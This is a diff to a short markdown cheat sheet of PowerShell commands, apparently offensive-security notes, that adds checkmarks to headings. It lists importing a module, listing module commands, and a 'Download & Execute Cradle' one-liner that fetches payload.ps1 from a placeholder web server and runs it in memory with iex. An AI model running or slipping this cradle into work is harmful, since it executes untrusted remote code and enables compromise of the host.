@@ -1,17 +1,17 @@
 ### Powershell Scripts/Modules
 
 
-Import Script or Module
+Import Script or Module :heavy_check_mark:
 ```
 Import-Module C:\path\to\script.ps1
 ```
 
-Find all commands in module
+Find all commands in module 
 ```
 Get-Command -Module <modulename>
 ```
 
-Download & Execute Cradle
+Download & Execute Cradle :heavy_check_mark:
 ```
 iex (New-Object Net.WebClient) .DownloadString('https://webservers/payload.ps1')
 ```
